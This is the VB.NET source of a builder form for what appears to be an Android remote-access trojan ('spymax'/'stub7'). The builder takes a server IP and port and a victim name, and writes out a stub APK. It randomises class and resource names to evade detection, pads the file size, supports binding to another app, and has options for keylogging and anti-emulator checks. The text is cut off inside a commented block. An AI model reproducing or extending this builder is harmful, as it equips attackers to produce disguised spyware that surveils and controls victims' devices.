Imports System.ComponentModel
Imports System.Drawing.Drawing2D
Imports System.IO
Imports System.Threading

Public Class 感语十间不谢语字外方伙我传这的词种答非说肉么么文余价思肉个么
    Private keyback As Boolean

    Private Package_keyback As Boolean

    Private keybackVersion As Boolean = False

    Private spl_arguments As String = "[x0b0x]"

    Private BIND_Path As String = "null"

    Private BIND_EX As String = "null"

    Private isuper As String = "off"

    Private intent_ As String = "null"

    Private iconPatch As String = "null"

    Private Programmatically As Boolean

    Private SplitterDNS As String = "[x0DNS0x]"

    Private colo0 As Color = Color.FromArgb(190, 190, 190)

    Private colo1 As Color = Color.FromArgb(20, 20, 20)

    Private tip As New Frm_Config_AndromedaScript
    Sub New()

        InitializeComponent()

        Me.Font = Frm_Config_Settings.f

    End Sub

    Private Sub b_Add_Click(sender As Object, e As EventArgs)


    End Sub


    Private Sub SpyStyle()
        'Me.BackColor = SpySettings.DefaultColor_Background

        'For Each gr As DataGridView In Panel1.Controls.OfType(Of DataGridView)()
        '    gr.BackgroundColor = SpySettings.DefaultColor_Background
        '    gr.BackColor = SpySettings.DefaultColor_Background
        '    gr.ColumnHeadersDefaultCellStyle.BackColor = SpySettings.DefaultColor_Background
        '    gr.DefaultCellStyle.BackColor = SpySettings.DefaultColor_Background
        '    gr.DefaultCellStyle.SelectionForeColor = SpySettings.DefaultColor_Background

        '    '\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

        '    gr.DefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground
        '    gr.DefaultCellStyle.SelectionBackColor = SpySettings.DefaultColor_Foreground
        '    gr.ColumnHeadersDefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground
        'Next

        'For Each gr As NumericUpDown In Panel1.Controls.OfType(Of NumericUpDown)()
        '    gr.ForeColor = SpySettings.DefaultColor_Foreground
        '    gr.BackColor = SpySettings.DefaultColor_Background
        '    RectInputText0.Add(New Rectangle(gr.Location.X - 1, gr.Location.Y - 1, gr.Width + 1, gr.Height + 1))
        'Next
        'For Each gr As Label In Panel1.Controls.OfType(Of Label)()
        '    gr.ForeColor = SpySettings.DefaultColor_Foreground
        '    gr.BackColor = SpySettings.DefaultColor_Background
        'Next
        'For Each gr As Button In Panel1.Controls.OfType(Of Button)()
        '    gr.BackColor = SpySettings.DefaultColor_Foreground
        '    gr.ForeColor = SpySettings.DefaultColor_Background
        'Next
        'For Each gr As TextBox In Panel1.Controls.OfType(Of TextBox)()
        '    gr.ForeColor = SpySettings.DefaultColor_Foreground
        '    gr.BackColor = SpySettings.DefaultColor_Background
        '    RectInputText0.Add(New Rectangle(gr.Location.X - 1, gr.Location.Y - 1, gr.Width + 1, gr.Height + 1))
        'Next
        'For Each gr As Label In Panel3.Controls.OfType(Of Label)()
        '    gr.ForeColor = SpySettings.DefaultColor_Foreground
        '    gr.BackColor = SpySettings.DefaultColor_Background
        'Next
        'For Each gr As Button In Panel3.Controls.OfType(Of Button)()
        '    gr.BackColor = SpySettings.DefaultColor_Foreground
        '    gr.ForeColor = SpySettings.DefaultColor_Background
        'Next
        'For Each gr As CheckBox In Panel3.Controls.OfType(Of CheckBox)()
        '    gr.BackColor = SpySettings.DefaultColor_Background
        '    gr.ForeColor = SpySettings.DefaultColor_Foreground
        'Next
        'For Each gr As NumericUpDown In Panel3.Controls.OfType(Of NumericUpDown)()
        '    gr.ForeColor = SpySettings.DefaultColor_Foreground
        '    gr.BackColor = SpySettings.DefaultColor_Background
        '    RectInputText1.Add(New Rectangle(gr.Location.X - 1, gr.Location.Y - 1, gr.Width + 1, gr.Height + 1))
        'Next
        'For Each gr As TextBox In Panel3.Controls.OfType(Of TextBox)()
        '    gr.ForeColor = SpySettings.DefaultColor_Foreground
        '    gr.BackColor = SpySettings.DefaultColor_Background
        '    RectInputText1.Add(New Rectangle(gr.Location.X - 1, gr.Location.Y - 1, gr.Width + 1, gr.Height + 1))
        'Next
        'For Each gr As Button In box.Controls.OfType(Of Button)()
        '    gr.BackColor = SpySettings.DefaultColor_Foreground
        '    gr.ForeColor = SpySettings.DefaultColor_Background
        'Next
        'For Each gr As Panel In box.Controls.OfType(Of Panel)()
        '    gr.BackColor = SpySettings.DefaultColor_Background
        'Next
        Me.Refresh()
    End Sub
    Private Sub TOpacity_Tick(sender As Object, e As EventArgs) Handles TOpacity.Tick
        If Not Me.Opacity = 1 Then
            Me.Opacity = Me.Opacity + 0.1
        Else
            Me.TOpacity.Enabled = False
            'Try
            '    Codes.ECO()
            'Catch ex As Exception

            'End Try
        End If
    End Sub
    Private Sub Build_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ' MetroSetTabControl1.SelectedIndex = 0
        Me.Icon = New Icon(Frm_Config_Settings.res_Path & "\Icons\win\4.ico")

        SpyStyle()



        Programmatically = True

        '  TextFutex.Text = GenRandom(5) & "-" & GenRandom(5) & "-" & GenRandom(5) & "-" & GenRandom(5)

        TextNameVictim.Text = My.Settings.build_text_name_victim

        TextNamePatch.Text = My.Settings.build_text_name_patch

        TextVersion.Text = My.Settings.build_text_version

        ' sleep.Value = My.Settings.build_text_sleep

        po.Text = My.Settings.build_text_port

        CheckHide.Checked = True

        CheckDoze.Checked = My.Settings.build_Checked_doze

        CheckIconPatch.Checked = My.Settings.build_Checked_icon

        iconPatch = My.Settings.build_path_icon

        If iconPatch.Length > 0 Then
            Try
                Guna2PictureBox21.Image = Image.FromFile(iconPatch)
            Catch ex As Exception

            End Try
        End If

        BIND_Path = My.Settings.BIND_Path

        BIND_EX = My.Settings.BIND_EX

        intent_ = My.Settings.intent



        'CheckOpenPackage.Checked = False



        If Not IO.File.Exists(BIND_Path) Then

            BIND_Path = "null"

            BIND_EX = "null"

            CheckBIND.Checked = False

        Else

            CheckBIND.Checked = True

        End If

        If Not IO.File.Exists(iconPatch) Then

            If Not iconPatch = "null" Then

                iconPatch = "null"

                CheckIconPatch.Checked = False

            End If

        End If


        Dim DNS As String = My.Settings.build_DGV_list

        If Not DNS = "null" Then

            Dim spl_Lines As String() = DNS.Split({SplitterDNS}, StringSplitOptions.None)

            For Each row In spl_Lines

                If row.Length > 0 Then

                    If row.Contains(":") Then

                        DGV0.Rows.Add(row)

                    End If

                End If

            Next

        End If

        TextIP.Text = Frm_Config_Codes.GetIPAddress()

        Programmatically = False

        Me.TOpacity.Interval = SpySettings.T_Interval

        Me.TOpacity.Enabled = True
    End Sub


    Private Sub TiMAT_Tick(sender As Object, e As EventArgs) Handles TiMAT.Tick

        'TextFutex.Text = GenRandom(5) & "-" & GenRandom(5) & "-" & GenRandom(5) & "-" & GenRandom(5)

    End Sub

    Private Sub TextFutex_MouseHover(sender As Object, e As EventArgs)

        '   TiMAT.Enabled = True

    End Sub

    Private Sub TextFutex_MouseLeave(sender As Object, e As EventArgs)

        '   TiMAT.Enabled = False

    End Sub

    '  Private Ismanul As Boolean = False
    Private PRIMS As String = ""

    Private THETYPE As String = "T"
    Private FAKEAPPNAME As String = " "
    Private FAKEAPPlink As String = " "
    Private FAKEAPPicon As String = "null"
    Private OFFKEYLOG As String = "null"
    Private ANTIEMO As String = "null"
    Private APKVERSION As String = "28"
    Private NOTIFI_MSG As String = ""
    Private NOTIFI_TITLE As String = ""
    Private HIDETYPE As String = ""
    Private TheTarget As String = ""
    Private UseRecorder As String = "NO"

    Private NewFakeSize As Integer = 0
    Private Sub SelectedApk_Click(sender As Object, e As EventArgs)



    End Sub


    Private _Time As Integer = 10

    Private _Bitmap_ICO As Bitmap = Nothing

    Private cou As Integer = 0


    Private ip, ports, namevictim, namepatch, version, proprty, sleepms, futex, flavor As String

    Private folder_building, folder_apktool, path_apktool, path_font, xPackage As String

    Private ftx As String()

    Private vulTrack As Integer = 0

    Private pack1 As String = "package"

    Private pack2 As String = "name"

    Private Const spymax As String = "spymax"

    Private Const stub7 As String = "stub7"

    '##
    Private Const ClassGen0 As String = "ClassGen0"
    Private Const ClassGen1 As String = "ClassGen1"
    Private Const ClassGen2 As String = "ClassGen2"
    Private Const ClassGen3 As String = "ClassGen3"
    Private Const ClassGen4 As String = "ClassGen4"
    Private Const ClassGen5 As String = "ClassGen5"
    Private Const ClassGen6 As String = "ClassGen6"
    'Private Const ClassGen7 As String = "ClassGen7"
    Private Const ClassGen8 As String = "ClassGen8"
    Private Const ClassGen9 As String = "ClassGen9"
    Private Const ClassGen10 As String = "ClassGen10"
    Private Const ClassGen11 As String = "ClassGen11"
    Private Const ClassGen12 As String = "ClassGen12"
    Private Const ClassGen13 As String = "ClassGen13"
    Private Const ClassGen14 As String = "ClassGen14"
    Private Const _ask_prim_ As String = "_ask_prim_"
    Private N_ask_prim_ As String = "_ask_prim_"
    Private Const _trns_g_ As String = "_trns_g_"
    Private N_trns_g_ As String = "_trns_g_"
    Private Const _cap_sc_ As String = "_cap_sc_"
    Private N_cap_sc_ As String = "_cap_sc_"
    Private Const _access_ask_ As String = "_access_ask_"
    Private N_access_ask_ As String = "_access_ask_"
    Private Const _scctrl_ As String = "_scctrl_"
    Private N_scctrl_ As String = "_scctrl_"
    Private Const _news_g_ As String = "_news_g_"
    Private N_news_g_ As String = "_news_g_"
    Private Const _sc_fb_ As String = "_sc_fb_"
    Private N_sc_fb_ As String = "_sc_fb_"
    Private Const _ask_draw_ As String = "_ask_draw_"
    Private N_ask_draw_ As String = "_ask_draw_"
    Private Const _ask_battary_ As String = "_ask_battary_"
    Private N_ask_battary_ As String = "_ask_battary_"
    Private Const _engine_wrk_ As String = "_engine_wrk_"
    Private N_engine_wrk_ As String = "_engine_wrk_"
    Private Const _skin_cls_ As String = "_skin_cls_"
    Private N_skin_cls_ As String = "_skin_cls_"
    Private Const _update_app_ As String = "_update_app_"
    Private N_update_app_ As String = "_update_app_"
    Private Const _callr_lsnr_ As String = "_engine_wrk_"
    Private N_callr_lsnr_ As String = "_engine_wrk_"

    Private Const _clss_loder_ As String = "_clss_loder_"
    Private N_clss_loder_ As String = "_clss_loder_"
    Private Const _excut_meth_ As String = "_excut_meth_"
    Private N_excut_meth_ As String = "_excut_meth_"
    Private Const _run_comnd_ As String = "_run_comnd_"
    Private N_run_comnd_ As String = "_run_comnd_"
    Private Const _get_me_fil_ As String = "_get_me_fil_"
    Private N_get_me_fil_ As String = "_get_me_fil_"

    Private Const _srv_worker_ As String = "_srv_worker_"
    Private N_srv_worker_ As String = "_srv_worker_"

    Private NClassGen0 As String = "QQ0"
    Private NClassGen1 As String = "QQ1"
    Private NClassGen2 As String = "QQ2"
    Private NClassGen3 As String = "QQ3"
    Private NClassGen4 As String = "QQ4"
    Private NClassGen5 As String = "QQ5"
    Private NClassGen6 As String = "QQ6"
    'Private NClassGen7 As String = "QQ7"
    Private NClassGen8 As String = "QQ8"
    Private NClassGen9 As String = "QQ9"
    Private NClassGen10 As String = "QQ10"
    Private NClassGen11 As String = "QQ11"
    Private NClassGen12 As String = "QQ12"
    Private NClassGen13 As String = "QQ13"
    Private NClassGen14 As String = "QQ14"
    '##
    Private payload As String = "payload"
    '##

    Private Const resoString0 As String = "j1j2j3j4j5j6"
    Private Const resoString1 As String = "c1c2c3c4c5c6"
    Private Const resoString2 As String = "z1z2z3z4z5z6"
    Private Const resoString3 As String = "f1f2f3f4f5f6"
    Private Const resoString4 As String = "h1h2h3h4h5h6"
    Private Const resoString5 As String = "t1t2t3t4t5t6"
    Private Const resoString6 As String = "n1n2n3n4n5n6"
    Private Const resoString7 As String = "i1i2i3i4i5i6"
    Private Const resoString8 As String = "k1k2k3k4k5k6"
    Private Const resoString9 As String = "o1o2o3o4o5o6"
    Private Const resoString10 As String = "u1u2u3u4u5u6"
    Private Const resoString11 As String = "e1e2e3e4e5e6"
    Private Const resoString12 As String = "y1y2y3y4y5y6"
    Private NresoString0 As String = "str0"
    Private NresoString1 As String = "str1"
    Private NresoString2 As String = "str2"
    Private NresoString3 As String = "str3"
    Private NresoString4 As String = "str4"
    Private NresoString5 As String = "str5"
    Private NresoString6 As String = "str6"
    Private NresoString7 As String = "str7"
    Private NresoString8 As String = "str8"
    Private NresoString9 As String = "str9"
    Private NresoString10 As String = "str10"
    Private NresoString11 As String = "str11"
    Private NresoString12 As String = "str12"

    Private Const app_reso0 As String = "b1b2b3b4b5b6"
    Private Napp_reso0 As String = "app0"

    Private Const draw_ico As String = "d1d2d3d4d5d6"
    Private Const draw_notifi As String = "x1x2x3x4x5x6"
    Private Ndraw_ico As String = "ico0"
    Private Ndraw_notifi As String = "ico1"

    Private Const webXML As String = "q1q2q3q4q5q6"
    Private NwebXML As String = "web0"

    Private Const notifiXML As String = "s1s2s3s4s5s6"
    Private NnotifiXML As String = "noti8"

    Private Sub EncryRando_notifiXML() '// MAX 255
        Dim min As Integer = 5
        Dim max As Integer = 25
        NnotifiXML = Randomunicode(min, max).ToString.ToLower
    End Sub

    Private Sub EncryRando_webXML() '// MAX 255
        Dim min As Integer = 5
        Dim max As Integer = 25
        NwebXML = Randomunicode(min, max).ToString.ToLower
    End Sub

    Private Sub EncryRando_drawable() '// MAX 255
        Dim min As Integer = 5
        Dim max As Integer = 25
        Ndraw_ico = Randomunicode(min, max).ToString.ToLower
        Ndraw_notifi = Randomunicode(min, max).ToString.ToLower
    End Sub

    Private Sub EncryRando_app_reso() '// MAX 255
        Dim min As Integer = 5
        Dim max As Integer = 25
        Napp_reso0 = Randomunicode(min, max)
    End Sub

    Private Sub EncryRandoreso()

        Dim min As Integer = 10
        Dim max As Integer = 25
        NresoString0 = Randomunicode(min, max)
        NresoString1 = Randomunicode(min, max)
        NresoString2 = Randomunicode(min, max)
        NresoString3 = Randomunicode(min, max)
        NresoString4 = Randomunicode(min, max)
        NresoString5 = Randomunicode(min, max)
        NresoString6 = Randomunicode(min, max)
        NresoString7 = Randomunicode(min, max)
        NresoString8 = Randomunicode(min, max)
        NresoString9 = Randomunicode(min, max)
        NresoString10 = Randomunicode(min, max)
        NresoString11 = Randomunicode(min, max)
        NresoString12 = Randomunicode(min, max)

    End Sub

    Private Sub EncryRando()

        LOG("Please Wait...")

        Dim min As Integer = 90
        Dim max As Integer = 100
        NClassGen0 = Randomunicode(min, max)
        NClassGen1 = Randomunicode(min, max)
        NClassGen2 = Randomunicode(min, max)
        NClassGen3 = Randomunicode(min, max)
        NClassGen4 = Randomunicode(min, max)
        NClassGen5 = Randomunicode(min, max)
        NClassGen6 = Randomunicode(min, max)
        'NClassGen7 = RandomString(min, max)
        NClassGen8 = Randomunicode(min, max)
        NClassGen9 = Randomunicode(min, max)
        NClassGen10 = Randomunicode(min, max)
        NClassGen11 = Randomunicode(min, max)
        NClassGen12 = Randomunicode(min, max)
        NClassGen13 = Randomunicode(min, max)
        NClassGen14 = Randomunicode(min, max)
        N_access_ask_ = Randomunicode(min, max)
        N_ask_battary_ = Randomunicode(min, max)
        N_ask_draw_ = Randomunicode(min, max)
        N_sc_fb_ = Randomunicode(min, max)
        N_news_g_ = Randomunicode(min, max)
        N_scctrl_ = Randomunicode(min, max)
        N_cap_sc_ = Randomunicode(min, max)
        N_trns_g_ = Randomunicode(min, max)
        N_ask_prim_ = Randomunicode(min, max)
        N_engine_wrk_ = Randomunicode(min, max)
        N_skin_cls_ = Randomunicode(min, max)
        N_update_app_ = Randomunicode(min, max)
        N_callr_lsnr_ = Randomunicode(min, max)
        N_clss_loder_ = Randomunicode(min, max)
        N_excut_meth_ = Randomunicode(min, max)
        N_run_comnd_ = Randomunicode(min, max)
        N_get_me_fil_ = Randomunicode(min, max)
        N_srv_worker_ = Randomunicode(min, max)
        payload = Randomunicode(min, max)

        '-------------------
        new_exit_mth = Randomunicode(min, max)
        new_wifipolc = Randomunicode(min, max)
        new_formatpacket = Randomunicode(min, max)
        new_dzip = Randomunicode(min, max)
        new_getbyte = Randomunicode(min, max)
        new_base_mth = Randomunicode(min, max)
        new_getstr = Randomunicode(min, max)
        new_czip = Randomunicode(min, max)
        new_inst = Randomunicode(min, max)


        '--------------------
        new_strt_con_ = Randomunicode(min, max)
        new_fist_inf_ = Randomunicode(min, max)
        new_new_con_ = Randomunicode(min, max)
        new_send_it_ = Randomunicode(min, max)
        new_Reblace_ = Randomunicode(min, max)
        new_runn_srv_ = Randomunicode(min, max)
        NEWRANDOM = Randomunicode(900, 1000)

    End Sub

    '.Replace("_isequel_mth_", RandomString(9, 15)) _
    '                                .Replace("_exit_meth_", RandomString(9, 15)) _
    '                                .Replace("_wifipolc_meth_", RandomString(9, 15)) _
    '                                .Replace("_formtpakt_methd_", RandomString(9, 15)) _
    '                                .Replace("_DZIP_meth_", RandomString(9, 15)) _
    '                                .Replace("_Getbyte_meth_", RandomString(9, 15)) _
    '                                .Replace("_D_BASE64_", RandomString(9, 15)) _
    '                                .Replace("_getstr_meth_", RandomString(9, 15)) _
    '                                .Replace("_CZIP_meth_", RandomString(9, 15)) _
    '                                .Replace("_inst_bnd_", RandomString(9, 15)) _

    Private new_exit_mth As String = "str0"
    Private new_wifipolc As String = "str1"
    Private new_formatpacket As String = "str2"
    Private new_dzip As String = "str3"
    Private new_getbyte As String = "str4"
    Private new_base_mth As String = "str5"
    Private new_getstr As String = "str5"
    Private new_czip As String = "str5"
    Private new_inst As String = "str5"
    '------------
    Private new_strt_con_ As String = "str5"
    Private new_fist_inf_ As String = "str5"
    Private new_new_con_ As String = "str5"
    Private new_send_it_ As String = "str5"
    Private new_Reblace_ As String = "str5"
    Private new_runn_srv_ As String = "str5"


    Private NEWRANDOM As String = ""



    Public rshit As Random = Nothing

    Function Randomunicode(minCharacters As Integer, maxCharacters As Integer)
        Dim s As String = "qazwsxedcrfvtgbyhnjmikolp"
        If rshit Is Nothing Then
            rshit = New Random
        End If
        'Dim chactersInString As Integer = rshit.Next(minCharacters, maxCharacters)
        Dim sb As String = ""
        While sb.Length < minCharacters
            sb += randmid(rnd.Next(0, randmid.Length)) + s(rnd.Next(0, s.Length - 1))
        End While

        cou += 1
        Return sb.ToString().ToLower & CStr(cou)
    End Function
    Private Function FixStrings(ByVal str As String) As String


        Dim c0 As String = "&"
        Dim p0 As String = "&amp;"

        Dim c1 As String = "<"
        Dim p1 As String = "&lt;"

        Dim c2 As String = """"
        Dim p2 As String = "\"""

        Dim c3 As String = "'"
        Dim p3 As String = "\'"

        Dim c4 As String = "?"
        Dim p4 As String = "\?"

        Dim c5 As String = "@"
        Dim p5 As String = "\@"

        If str.Contains(c0) Then
            If Not str.Contains(p0) Then
                str = str.Replace(c0, p0)
            End If
        End If


        If str.Contains(c1) Then
            If Not str.Contains(p1) Then
                str = str.Replace(c1, p1)
            End If
        End If

        If str.Contains(c2) Then
            If Not str.Contains(p2) Then
                str = str.Replace(c2, p2)
            End If
        End If

        If str.Contains(c3) Then
            If Not str.Contains(p3) Then
                str = str.Replace(c3, p3)
            End If
        End If

        If str.Contains(c4) Then
            If Not str.Contains(p4) Then
                str = str.Replace(c4, p4)
            End If
        End If

        If str.Contains(c5) Then
            If Not str.Contains(p5) Then
                str = str.Replace(c5, p5)
            End If
        End If
        Return str

    End Function

    Private KEY As String
    Private Sub StartWork(final As String)
        KillA()
        Dim arguments As String = final
        If Not arguments = Nothing Then
            cou = 1
            Dim spl As String() = arguments.Split({spl_arguments}, StringSplitOptions.None)

            ip = spl(0)

            ports = spl(1)

            namevictim = FixStrings(spl(2))

            namepatch = FixStrings(spl(3))

            version = spl(4)


            Dim Proandkey = spl(5).Split(":")

            proprty = Proandkey(0)

            KEY = Proandkey(1)

            sleepms = spl(6)

            futex = spl(7)

            ' ftx = futex.Split({"-"}, StringSplitOptions.None)

            path_apktool = spl(8)

            '  path_Apk = spl(9)

            path_font = spl(10)

            flavor = spl(11)

            Dim sColor As String() = spl(12).Split("|")
            Dim vColor1 As String() = sColor(0).Split(",")
            Dim vColor2 As String() = sColor(1).Split(",")




            iconPatch = spl(13)

            If IO.File.Exists(iconPatch) Then

                _Bitmap_ICO = ResizeImage(New Bitmap(iconPatch), New Size(144, 144))

            End If

            BIND_Path = spl(16)

            BIND_EX = spl(17)

            intent_ = FixStrings(spl(18))

            xPackage = spl(19)

            If xPackage.Contains(".") Then

                Dim ar As String() = xPackage.Split(".")

                pack1 = ar(0)

                pack2 = ar(1)

            End If

            EncryRando()

            EncryRandoreso()

            EncryRando_app_reso()

            EncryRando_drawable()

            EncryRando_webXML()

            EncryRando_notifiXML()

            Dim F0ntStyle As FontStyle = FontStyle.Regular
            Dim ttFont As String = "Hack-Regular.ttf"
            Select Case spl(14)
                Case "Bold"
                    F0ntStyle = FontStyle.Bold
                    ttFont = "Hack-Bold.ttf"
                Case "Regular"
                    F0ntStyle = FontStyle.Regular
                    ttFont = "Hack-Regular.ttf"
                Case Else
                    F0ntStyle = FontStyle.Regular
                    ttFont = "Hack-Regular.ttf"
            End Select

            Dim F0ntSize As Integer = CInt(spl(15))

            'Font8 = CustomFont.LoadFont(F0ntSize, F0ntStyle, path_font & ttFont)

            '  start = System.DateTime.Now()

            'vulTrack = 10

            't.Enabled = True

            LOG("Starting..." + vbNewLine + "----------")
            LOG(למоДלל得Яdתط动طנsХydiבc会וWב食רA英ظ("Q2XJfkb/FDYyn6oQAan0AoieKOTccLOjmNDp0sxYfEc=", "42366745674"))
            LOG(למоДלל得Яdתط动طנsХydiבc会וWב食רA英ظ("c0a12L4SpB9aSuciSToKSR6iLl36zEAdozp+ypa7zB0=", "ergsaerhhethrthb"))
            LOG(למоДלל得Яdתط动طנsХydiבc会וWב食רA英ظ("H3kPQPrr5l67ij4IrYdlSA==", "f3qg445hw4hb"))
            For index = 5 To 1 Step -1
                LOG(index.ToString)
                Thread.Sleep(1000)

            Next

            Dim th0 As System.Threading.Thread = New Threading.Thread(AddressOf Step1)

            th0.IsBackground = True

            th0.Start()
        End If
    End Sub
    Public Shared Sub DeleteDirectory(ByVal target_dir As String)
        Dim files As String() = IO.Directory.GetFiles(target_dir)
        Dim dirs As String() = IO.Directory.GetDirectories(target_dir)

        For Each file As String In files
            IO.File.SetAttributes(file, IO.FileAttributes.Normal)
            IO.File.Delete(file)
        Next

        For Each dir As String In dirs
            DeleteDirectory(dir)
        Next

        IO.Directory.Delete(target_dir, False)
    End Sub

    Public oncedelete As Boolean = True
    Private Sub Step1()

        Dim driv As String = GetDriv()

Back0:

        Threading.Thread.Sleep(_Time)

        folder_building = driv & "Andromeda_Software"

        If Environment.Is64BitOperatingSystem Then

            folder_apktool = folder_building & "\platformBinary64\bin"
        Else

            folder_apktool = folder_building & "\platformBinary32\bin"
        End If

        Try

            If IO.Directory.Exists(folder_building) And oncedelete Then
                oncedelete = False
                LOG("Deleting old Files...")
                DeleteDirectory(folder_building)
                ' IO.Directory.Delete(folder_building)
            End If
        Catch ex As Exception
            LOG("File delete old" + ex.Message)
        End Try



        Try
            '
            '  LOG("Extracting Files..." + vbNewLine + "----------")
            LOG("Extracting New Files...")
            If Not IO.Directory.Exists(folder_building) Then


                IO.Directory.CreateDirectory(folder_building)

                GoTo Back0

            End If

            vulTrack = 20

            If Not IO.Directory.Exists(folder_apktool) Then

                IO.Directory.CreateDirectory(folder_apktool)

                GoTo Back0

            End If

            vulTrack = 30

            If IO.Directory.Exists(folder_apktool) Then

                Try

                    If IO.Directory.GetFiles(folder_apktool, "*.*").Count = 0 Then
                        '  LOG("UNZIP , Only First Time..." + vbNewLine + "----------")
                        File_zip_Decompress(path_apktool, folder_building)

                    End If

                Catch ex As Exception

                End Try

            End If

            vulTrack = 35
Back1:

            Threading.Thread.Sleep(_Time)
            LOG("Read Configuration...")
            If IO.Directory.Exists(folder_building) And IO.Directory.Exists(folder_apktool) Then

                Try

                    Dim path As String = folder_apktool & "\" & tempApk

                    If IO.Directory.Exists(folder_apktool & "\" & tempApk) Then

                        System.IO.Directory.Delete(path, True)

                    End If

                    If System.IO.File.Exists(folder_apktool & "\" & tempApk & ".apk") Then

                        System.IO.File.Delete(folder_apktool & "\" & tempApk & ".apk")

                    End If

                    If System.IO.File.Exists(folder_apktool & "\output\ready.apk") Then

                        System.IO.File.Delete(folder_apktool & "\output\ready.apk")

                    End If

                    If HIDETYPE = "TEN" Then
                        System.IO.File.WriteAllBytes(folder_apktool & "\" & tempApk & ".apk", My.Resources.MYSTUBTEN)

                    Else
                        System.IO.File.WriteAllBytes(folder_apktool & "\" & tempApk & ".apk", My.Resources.MYSTUB)

                    End If


                    Dim canRun As Boolean = CMD_running()

                    If canRun Then

                        vulTrack = 40

                        CMD.StandardInput.WriteLine("cd " & folder_apktool) ' ادخل في مسار

                        CMD.StandardInput.WriteLine("java -version") 'تحقق من وجود جافا java -version
                        LOG("Working...")
                    End If

                Catch ex As Exception

                    GoTo Back1

                End Try

            End If

        Catch ex As Exception

            Me.Close()

        End Try

    End Sub

    Private Function CMD_running() As Boolean

        Try

            CMD = New Process

            CMD.StartInfo.RedirectStandardOutput = True

            CMD.StartInfo.RedirectStandardInput = True

            CMD.StartInfo.RedirectStandardError = True

            CMD.StartInfo.FileName = "cmd.exe"

            AddHandler CType(CMD, Process).OutputDataReceived, AddressOf Sync_Output

            AddHandler CType(CMD, Process).ErrorDataReceived, AddressOf Sync_Output

            AddHandler CType(CMD, Process).Exited, AddressOf ex

            CMD.StartInfo.UseShellExecute = False

            CMD.StartInfo.CreateNoWindow = True

            CMD.StartInfo.WindowStyle = ProcessWindowStyle.Hidden

            CMD.EnableRaisingEvents = True

            CMD.Start()

            CMD.BeginOutputReadLine()

            CMD.BeginErrorReadLine()

            Return True

        Catch ex As Exception

            Return False

        End Try

    End Function


    Public pumpstarted As Boolean = False
    Public pumpfinished As Boolean = False
    Public firstpump As Boolean = False
    Private FolderApk As Boolean = False
    Private Builtapk As Boolean = False
    Delegate Sub Delegate0(ByVal d0 As Object, b0 As Object)
    Private StartedZip As Boolean = False

    Public Sub Pumper(ByVal NewSize As Integer)
        Try
            'Threading.Thread.Sleep(5000)
            Dim filesize As Double = Val(NewSize)
            filesize = filesize * 1024
            Dim newname As String = Randomunicode(5, 15)
            Dim filetemp = IO.Path.GetTempPath + "\" + newname + ".png"

            My.Resources._3g.Save(filetemp)

            Dim filetopump = IO.File.OpenWrite(filetemp)
            Dim size = filetopump.Seek(0, IO.SeekOrigin.[End])
            Dim zero As Boolean = False
            While size < filesize

                If zero Then
                    zero = False
                    filetopump.WriteByte(0)
                Else
                    zero = True
                    filetopump.WriteByte(1)
                End If


                size += 1
            End While
            filetopump.Close()

            Dim newpath As String = folder_apktool & "\" & tempApk & "\res\drawable-xxxhdpi\" + "freespace" + ".png"
            If File.Exists(newpath) Then
                File.Delete(newpath)
            End If
            IO.File.Move(filetemp, newpath)
        Catch ex As Exception
            MsgBox("Resize apk error 1 " + ex.Message)
        End Try
        Try
            'Threading.Thread.Sleep(5000)
            Dim filesize As Double = Val(NewSize)
            filesize = filesize * 1024
            Dim newname As String = Randomunicode(5, 15)
            Dim filetemp = IO.Path.GetTempPath + "\" + newname + ".png"

            My.Resources._3g.Save(filetemp)

            Dim filetopump = IO.File.OpenWrite(filetemp)
            Dim size = filetopump.Seek(0, IO.SeekOrigin.[End])
            Dim zero As Boolean = False
            While size < filesize

                If zero Then
                    zero = False
                    filetopump.WriteByte(0)
                Else
                    zero = True
                    filetopump.WriteByte(1)
                End If


                size += 1
            End While
            filetopump.Close()

            ' Dim newpath As String = folder_apktool & "\" & tempApk & "\res\drawable-xxxhdpi\" + "freespace" + ".png"
            Dim b As String = folder_apktool & "\" & tempApk & "\build\apk\res\drawable-xxxhdpi\" & "freespace.png"
            If File.Exists(b) Then
                File.Delete(b)
            End If
            IO.File.Move(filetemp, b)
        Catch ex As Exception
            MsgBox("Resize apk error 2 " + ex.Message)
        End Try
        pumpfinished = True
    End Sub


    Public Sub Sync_Output(ByVal d01 As Object, ByVal b01 As Object)
        '        Try

        '            If Me.InvokeRequired Then

        '                Dim iInvoke As New Delegate0(AddressOf Sync_Output)

        '                Me.Invoke(iInvoke, New Object() {d01, b01})

        '                Exit Sub

        '            Else

        '                If Not String.IsNullOrEmpty(b01.Data) Then

        '                    Threading.Thread.Sleep(1)

        '                    If b01.Data.ToString.Contains("OpenJDK") Then ' OK

        '                        If Not Once Then
        '                            CMD.StandardInput.WriteLine("apktool d " & tempApk & ".apk")
        '                            Once = True
        '                        End If

        '                        '  b01.Data = ""
        '                        ' فك تغليف

        '                    ElseIf b01.Data.ToString.Contains("java -jar SignApk.jar") Or b01.Data.ToString.Contains("java -jar " & folder_apktool & "\SignApk.jar ") Then 'OK

        '                        'جاهز
        '                        Step3()

        '                    ElseIf b01.Data.ToString.Contains("Copying original files") Then 'OK

        '                        'انتظر حتى تنتهي من فك التغليف

        '                        Dim th1 As System.Threading.Thread = New Threading.Thread(AddressOf Step2)

        '                        th1.IsBackground = True

        '                        th1.Start()

        '                    ElseIf b01.Data.ToString.Contains("Built apk") Then 'OK


        'holdver:
        '                        ' انتظر حتى يتم الانتهاء من تغليف الملف 
        '                        If Not File.Exists(folder_apktool & "\" & tempApk & "\dist\" & tempApk & ".apk") Then
        '                            Threading.Thread.Sleep(5000)
        '                            LOG("Not Yet")
        '                            GoTo holdver
        '                        End If

        '                        If Not StartedZip Then

        '                            If Not StartedZip Then
        '                                CMD.StandardInput.WriteLine("zipalign.exe -v 4 " & folder_apktool & "\" & tempApk & "\dist\" & tempApk & ".apk " & folder_apktool & "\" & tempApk & "\dist\" & tempApk & "zip" & ".apk ") ' توقيعك

        '                                LOG(" Verification...")
        '                                StartedZip = True
        '                            End If
        '                            Threading.Thread.Sleep(5000)
        '                            GoTo holdver
        '                        Else

        '                            LOG("Apk Signing...")

        '                            ''File.Delete(folder_apktool & "\certificate.pem")
        '                            '' File.Delete(folder_apktool & "\key.pk8")



        '                            'File.WriteAllBytes(folder_apktool & "\certificate.pem", My.Resources.c)
